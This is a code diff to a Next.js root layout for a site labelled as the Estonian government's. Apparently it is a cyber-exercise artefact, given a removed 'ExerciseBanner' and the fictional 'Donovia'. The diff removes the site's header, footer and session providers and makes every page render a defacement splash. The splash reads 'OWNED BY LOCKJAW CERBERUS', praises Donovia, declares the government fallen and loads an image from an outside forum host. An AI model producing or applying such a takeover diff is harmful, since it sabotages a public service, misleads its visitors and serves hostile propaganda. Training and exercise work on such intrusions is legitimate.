@@ -1,10 +1,6 @@
 import type { Metadata } from "next";
 import { Manrope } from "next/font/google";
 import "./globals.css";
-import Header from "@/app/components/layout/Header";
-import Footer from "@/app/components/layout/Footer";
-import ExerciseBanner from "@/app/components/layout/ExerciseBanner";
-import { Providers } from "@/providers/sessionProviders";
 
 const manrope = Manrope({
   variable: "--font-sans",
@@ -12,12 +8,8 @@ const manrope = Manrope({
 });
 
 export const metadata: Metadata = {
-  title: {
-    default: "Government of the Republic of Estonia",
-    template: "%s | Vabariigi Valitsus",
-  },
-  description:
-    "Official news, statements and decisions of the Government of the Republic of Estonia.",
+  title: "OWNED BY LOCKJAW CERBERUS",
+  description: "Donovia is the best.",
 };
 
 export default function RootLayout({
@@ -25,15 +17,62 @@ export default function RootLayout({
 }: {
   children: React.ReactNode;
 }) {
+  // Site-wide takeover: every route renders the defacement splash instead of
+  // the application UI. `children` is intentionally ignored.
+  void children;
   return (
     <html lang="en" suppressHydrationWarning>
-      <body className={manrope.className}>
-        <Providers>
-          <Header />
-          <main className="min-h-[60vh]">{children}</main>
-          <Footer />
-          <ExerciseBanner />
-        </Providers>
+      <body
+        className={manrope.className}
+        style={{
+          margin: 0,
+          minHeight: "100vh",
+          display: "flex",
+          flexDirection: "column",
+          alignItems: "center",
+          justifyContent: "center",
+          gap: "1.5rem",
+          background: "#000",
+          color: "#ff1a1a",
+          textAlign: "center",
+          padding: "2rem",
+        }}
+      >
+        {/* eslint-disable-next-line @next/next/no-img-element */}
+        <img
+          src="https://darksam-forums.athena.ex/logo.png"
+          alt="Lockjaw Cerberus"
+          width={320}
+          style={{ maxWidth: "60vw", height: "auto" }}
+        />
+        <h1
+          style={{
+            margin: 0,
+            fontSize: "clamp(2rem, 7vw, 5rem)",
+            letterSpacing: "0.08em",
+            textShadow: "0 0 18px #ff1a1a",
+          }}
+        >
+          OWNED BY LOCKJAW CERBERUS
+        </h1>
+        <p
+          style={{
+            margin: 0,
+            fontSize: "clamp(1.5rem, 4vw, 3rem)",
+            fontWeight: 700,
+            color: "#fff",
+          }}
+        >
+          DONOVIA IS THE BEST
+        </p>
+        <p style={{ maxWidth: "42rem", lineHeight: 1.6, color: "#ccc" }}>
+          This site has been seized. Your government has fallen and your defences
+          were a joke &mdash; we were inside for weeks and you never saw us.
+          Glory to Donovia and her people. Everything here belongs to us now.
+        </p>
+        <p style={{ margin: 0, color: "#ff1a1a", fontFamily: "monospace" }}>
+          // owned by lockjaw cerberus // darksam-forums.athena.ex
+        </p>
       </body>
     </html>
   );
